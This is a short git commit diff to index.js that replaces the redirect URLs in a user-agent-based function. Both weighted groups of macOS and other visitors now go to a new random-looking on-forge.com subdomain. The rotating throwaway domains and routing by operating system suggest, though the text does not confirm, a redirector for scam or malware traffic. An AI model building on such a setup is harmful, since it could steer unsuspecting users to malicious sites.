5e116e9b3938bed5b196f0ae093e90f8d9b58a4c
animalinside <akshay.anand12@yahoo.com>
2026-05-04 07:24:07 +0530

    Update index.js

--- index.js
+++ index.js
@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://kjhgfddfggyhuu.on-forge.com/",
-            others: "https://kjhgfddfggyhuu.on-forge.com/"
+            macos: "https://nbcvbnhjkkjjj.on-forge.com/",
+            others: "https://nbcvbnhjkkjjj.on-forge.com/"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://kjhgfddfggyhuu.on-forge.com/",
-            others: "https://kjhgfddfggyhuu.on-forge.com/"
+            macos: "https://nbcvbnhjkkjjj.on-forge.com/",
+            others: "https://nbcvbnhjkkjjj.on-forge.com/"
         }
     ];
 
